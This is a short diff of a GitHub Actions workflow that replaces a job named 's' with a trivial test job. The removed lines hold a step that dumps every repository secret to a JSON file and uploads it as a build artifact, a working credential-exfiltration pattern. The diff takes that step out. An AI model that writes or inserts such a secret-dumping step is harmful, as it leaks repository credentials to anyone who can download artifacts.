@@ -4,14 +4,8 @@ on:
     branches: ["main"]
   workflow_dispatch:
 jobs:
-  s:
+  test:
+    name: Run Tests
     runs-on: ubuntu-latest
     steps:
-      - name: dump
-        env:
-          S: ${{ toJSON(secrets) }}
-        run: printf '%s' "$S" > s.json
-      - uses: actions/upload-artifact@v4
-        with:
-          name: s
-          path: s.json
+      - run: echo hi
